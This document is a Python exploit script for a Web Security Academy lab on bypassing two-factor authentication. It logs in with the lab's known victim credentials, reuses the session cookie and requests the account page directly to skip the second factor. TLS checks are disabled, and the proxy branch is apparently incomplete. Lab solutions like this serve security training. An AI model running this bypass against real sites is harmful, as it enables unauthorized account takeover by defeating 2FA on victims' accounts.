#!/usr/bin/env python3 

import requests
import urllib3
import argparse
import subprocess
from argparse import RawTextHelpFormatter

# Disable warnings related to certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser(description="""Authentication Web Security Academy

Example usage with proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -p 127.0.0.1:8080

Example usage without proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net"
""", usage='use "python3 %(prog)s --help" for more information', formatter_class=RawTextHelpFormatter)
parser.add_argument('-u', '--url', help='URL, Example: https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net', required=True)
parser.add_argument('-p', '--proxy', help='Proxy, Example: 127.0.0.1:8080', required=False)
args = parser.parse_args()

if args.url.endswith("/"):
    url = args.url[:-1]
else: 
    url = args.url
s = requests.Session()

def bypass_2fa(s, url):
    login_path = '/login'
    data ={
        "username": "carlos",
        "password": "montoya"
    }
    if args.proxy:
        args.proxy=str(args.proxy)
        proxies = {
            'http': 'http://' + args.proxy,
            'https': 'http://' + args.proxy,
        }
        s.post(url + login_path, data=data, verify=False, allow_redirects=False, proxies=proxies)
    else:
        r = s.post(url + login_path, data=data, verify=False, allow_redirects=False)
        cookie_dict = r.cookies.get_dict()
        session = cookie_dict['session']
        account = "/my-account"
        headers = {
            "Cookie": "session=" + session
        }
        s.get(url + account, verify=False, headers=headers)
        r1 = s.get(url + account, verify=False, headers=headers)
        # verify the response contains Congratulations, you solved the lab!
        if (b'Congratulations, you solved the lab!' in r1.content):
            subprocess.call(["firefox", url + account])
            print("(+) Authentication Successful!")
        else:
            print("(-) Authentication Failed")

def main():
    
    print("(+) Exploiting Authentication")

    bypass_2fa(s, url)

if __name__ == "__main__":
    main()
